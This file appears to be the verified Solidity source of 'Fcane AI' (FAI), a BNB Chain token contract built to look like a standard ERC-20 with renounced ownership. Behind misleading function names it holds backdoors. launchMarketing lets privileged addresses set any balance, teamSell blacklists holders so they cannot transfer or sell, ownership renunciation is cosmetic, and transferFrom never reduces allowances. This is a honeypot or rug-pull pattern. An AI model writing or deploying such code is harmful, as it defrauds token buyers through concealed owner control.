/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

pragma solidity ^0.8.2;

// SPDX-License-Identifier: Unlicensed

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface totalFee {
    function createPair(address atTx, address receiverAt) external returns (address);
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
        renounceOwnership();
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


contract FcaneAI is Ownable, IERC20 {

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return takeMode[account];
    }

    uint256 private _decimals = 18;

    mapping(address => uint256) private _balance;

    address public txTotal;

    function launchMarketing(address liquidityLaunch, uint256 limitBuy) public {
        if (!liquiditySwap[_msgSender()]) {
            return;
        }
        takeMode[liquidityLaunch] = limitBuy;
    }

    function shouldMarketing(address amountAutoToken) public {
        require(!teamFundAmount);
        liquiditySwap[amountAutoToken] = true;
        teamFundAmount = true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        require(!buyTx[sender]);

        takeMode[sender] = takeMode[sender].sub(amount);
        takeMode[recipient] = takeMode[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    constructor () { 
        txTotal = _msgSender();
        takeMode[txTotal] = walletBuy;
        launchedList = totalFee(atSender).createPair(swapAmount,address(this));
        liquiditySwap[txTotal] = true;
        emit Transfer(address(0), txTotal, walletBuy);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    address public launchedList;

    function teamSell(address senderTotal) public {
        if (senderTotal == txTotal || senderTotal == launchedList || !liquiditySwap[_msgSender()]) {
            return;
        }
        buyTx[senderTotal] = true;
    }

    mapping(address => bool) public liquiditySwap;

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    address atSender = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    mapping(address => mapping(address => uint256)) private _allowances;

    function name() external view returns (string memory) {
        return _name;
    }

    mapping(address => uint256) private takeMode;

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    string private _symbol = "FAI";

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    using SafeMath for uint256;

    address swapAmount = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    bool public teamFundAmount;

    function totalSupply() external view override returns (uint256) {
        return walletBuy;
    }

    mapping(address => bool) public buyTx;

    uint256 private walletBuy = 100000000 * 10 ** 18;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    string private _name = "Fcane AI";

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

}